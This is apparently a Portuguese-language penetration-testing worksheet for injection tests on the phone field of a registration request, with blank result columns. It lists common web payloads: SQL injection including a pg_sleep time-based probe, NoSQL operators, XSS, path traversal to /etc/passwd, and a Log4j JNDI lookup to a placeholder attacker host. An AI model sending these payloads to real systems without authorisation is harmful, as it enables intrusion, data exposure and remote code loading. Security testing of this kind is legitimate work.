# B9 — Injeções no campo `phone` do cadastro

**Endpoint:** request de **registro** (capturar uma e mandar pro
Repeater).
**Objetivo:** Detectar SQL injection, NoSQL injection, XSS reflexivo,
LDAP injection, path traversal, log4j (JNDI).

> Para cada payload, cole o status, primeiros bytes do body e qualquer
> sinal de execução (delay > 5s = SQL time-based, eco do payload no
> body = XSS, erro de SQL = error-based).

---

## Tabela

| # | Payload                              | Status | Body curto / sinal |
|---|---------------------------------------|--------|--------------------|
| 1 | `' OR '1'='1`                          |        |                    |
| 2 | `" OR "1"="1`                          |        |                    |
| 3 | `admin'--`                             |        |                    |
| 4 | `') OR ('1'='1`                        |        |                    |
| 5 | `1) OR (1=1`                           |        |                    |
| 6 | `1; SELECT pg_sleep(5)--`              |        |                    |
| 7 | `0x6164 6d69 6e`                       |        |                    |
| 8 | `{"$ne": null}` (no campo phone)       |        |                    |
| 9 | `{"$gt": ""}`                          |        |                    |
| 10| `<script>alert(1)</script>`            |        |                    |
| 11| `javascript:alert(1)`                  |        |                    |
| 12| `%00admin`                             |        |                    |
| 13| `../../../etc/passwd`                  |        |                    |
| 14| `${jndi:ldap://attacker/x}`            |        |                    |

## Achados notáveis

> Para cada linha onde o status foi 500 ou onde o body trouxe stacktrace
> ou eco do payload, cole a request+response completa aqui.

```
```

## Tempo de resposta

> Anote o tempo (ms) das requisições com `pg_sleep(5)` ou similar. Se
> der > 5000ms, é SQLi confirmada.

| Payload     | Tempo (ms) |
|-------------|-----------|
| pg_sleep(5) |           |

---

## Resumo

- SQLi:
- NoSQLi:
- XSS:
- Log4j (JNDI):
